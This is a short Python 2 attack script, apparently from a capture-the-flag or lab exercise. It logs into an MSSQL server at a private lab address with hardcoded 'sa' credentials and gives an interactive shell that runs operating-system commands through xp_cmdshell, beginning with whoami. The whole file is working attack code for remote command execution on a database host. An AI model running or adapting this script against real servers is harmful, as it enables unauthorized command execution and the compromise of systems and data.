#!/usr/bin/env python2
from __future__ import print_function

# Author: Alamot
# Use pymssql >= 1.0.3 (otherwise it doesn't work correctly)
import _mssql
import sys
from pwn import *
from base64 import b64encode

MSSQL_SERVER="10.13.38.11"
sa_MSSQL_USERNAME = "sa_user"
sa_MSSQL_PASSWORD = "PickAStr0ng0ne$"
TIMEOUT = 30


def print_result(mssql):
    for row in list(mssql)[:-1]:
        for column in row.keys()[:-1]:
            print(row[column], end=' ')
        print("")


def shell():
    mssql = None
    try:
        mssql = _mssql.connect(server=MSSQL_SERVER, user=sa_MSSQL_USERNAME, password=sa_MSSQL_PASSWORD)
        log.success("Successful login at mssql server "+MSSQL_SERVER+", username '"+sa_MSSQL_USERNAME+"' and password '"+sa_MSSQL_PASSWORD+"'")

        cmd = "whoami"
        mssql.execute_query("EXEC xp_cmdshell '" + cmd + "'")
        print_result(mssql)
        
        while True:
            cmd = raw_input("> ").rstrip("\n")
            if cmd.lower()[0:4] == "exit":
                mssql.close()
                return                
            
            mssql.execute_query("EXEC xp_cmdshell '" + cmd + "'")
            print_result(mssql)
            
        
    except _mssql.MssqlDatabaseException as e:
        if  e.severity <= 16:
            log.failure("MSSQL failed: "+str(e))
        else:
            raise
            
    finally:
        if mssql:
            mssql.close()

shell()
sys.exit()
